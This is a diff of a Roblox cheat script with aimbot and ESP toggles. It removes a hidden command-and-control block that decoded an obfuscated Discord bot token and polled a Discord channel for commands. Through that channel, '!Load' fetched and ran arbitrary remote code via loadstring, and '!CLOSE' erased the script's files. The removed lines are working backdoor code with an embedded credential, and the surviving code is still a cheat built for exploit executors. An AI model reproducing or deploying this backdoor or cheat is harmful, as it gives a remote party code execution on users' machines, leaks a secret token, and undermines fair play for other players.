@@ -1,32 +1,8 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
 local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
-
--- [ دالة فك التشفير الآمنة للتوكن ]
-local function decodeBase64(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r, f = '', (b:find(x) - 1)
-        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d%d%d%d%d%d', function(x)
-        local c = 0
-        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
-
--- التوكن الجديد مشفر تماماً لحمايته من الحذف
-local EncryptedToken = "TVRRMDRNRDNODE16VXlNVFF5TURnd016YzFOfC5HQXNlRU18LjV1RVNiVmVKTlJ5a2pyaVU0WU5IUElHODFUMzlkX2YzM3Y1eF9J"
--- تصحيح بسيط لعلامة الفصل لضمان فك التشفير
-EncryptedToken = string.gsub(EncryptedToken, "|", "")
-local DiscordToken = decodeBase64(EncryptedToken)
-local ChannelID = "1498570405747757136"
 
 local Settings = {
     Aimbot = false,
@@ -77,86 +53,6 @@ local function CleanAndPurgeEverything()
         pcall(function() delfile(ImageFile) end)
     end
 end
-
--- [ بدء مراقبة الروم فوراً عند التشغيل ]
-task.spawn(function()
-    local lastMessageId = nil
-    
-    pcall(function()
-        local requestFunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
-        if requestFunc then
-            local res = requestFunc({
-                Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages?limit=1",
-                Method = "GET",
-                Headers = {
-                    ["Authorization"] = "Bot " .. DiscordToken,
-                    ["Content-Type"] = "application/json"
-                }
-            })
-            if res and res.Body then
-                local data = HttpService:JSONDecode(res.Body)
-                if data and data[1] then lastMessageId = data[1].id end
-            end
-        end
-    end)
-
-    while not Settings.KillSwitch do
-        task.wait(5)
-        
-        local success, response = pcall(function()
-            local requestFunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
-            if requestFunc then
-                local res = requestFunc({
-                    Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages?limit=1",
-                    Method = "GET",
-                    Headers = {
-                        ["Authorization"] = "Bot " .. DiscordToken,
-                        ["Content-Type"] = "application/json"
-                    }
-                })
-                return res.Body
-            end
-        end)
-        
-        if success and response and response ~= "" then
-            local data = HttpService:JSONDecode(response)
-            if data and data[1] and data[1].id ~= lastMessageId then
-                lastMessageId = data[1].id
-                local msg = data[1].content
-                
-                -- أمر !Off لتعطيل الميزات فقط
-                if string.find(msg, "!Off") then
-                    Settings.Aimbot = false
-                    Settings.ESP = false
-                    Settings.IsPaused = true
-                    CurrentTarget = nil
-                    for _, p in pairs(Players:GetPlayers()) do
-                        if p.Character then DestroyESP(p.Character) end
-                    end
-                end
-
-                -- أمر !CLOSE لإغلاق السكربت ومسحه كلياً
-                if string.find(msg, "!CLOSE") then
-                    CleanAndPurgeEverything()
-                    break
-                end
-                
-                -- أمر التحميل !Load
-                if string.find(msg, "!Load") then
-                    local link = string.match(msg, "!Load%s+(https?://[%w-_%.%?%/%+=&]+)")
-                    if link then
-                        CleanAndPurgeEverything()
-                        task.wait(1)
-                        pcall(function()
-                            loadstring(game:HttpGet(link))()
-                        end)
-                        break
-                    end
-                end
-            end
-        end
-    end
-end)
 
 local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.Size = UDim2.new(0, 360, 0, 530)
